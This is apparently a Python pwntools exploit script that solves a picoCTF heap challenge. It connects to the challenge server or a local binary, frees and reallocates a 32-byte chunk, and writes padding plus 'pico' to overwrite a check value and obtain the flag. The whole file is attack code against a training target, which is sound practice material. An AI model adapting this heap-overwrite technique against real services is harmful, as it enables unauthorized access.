#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tethys.picoctf.net", 54375)

    return r


def main():
    r = conn()

    r.sendlineafter(b"choice: ", b"5")
    r.sendlineafter(b"choice: ", b"2")
    r.sendlineafter(b"allocation: ", b"32")
    r.sendlineafter(b"flag: ", b"A" * 0x1e + b"pico")
    r.sendlineafter(b"choice: ", b"4")
    r.interactive()


if __name__ == "__main__":
    main()
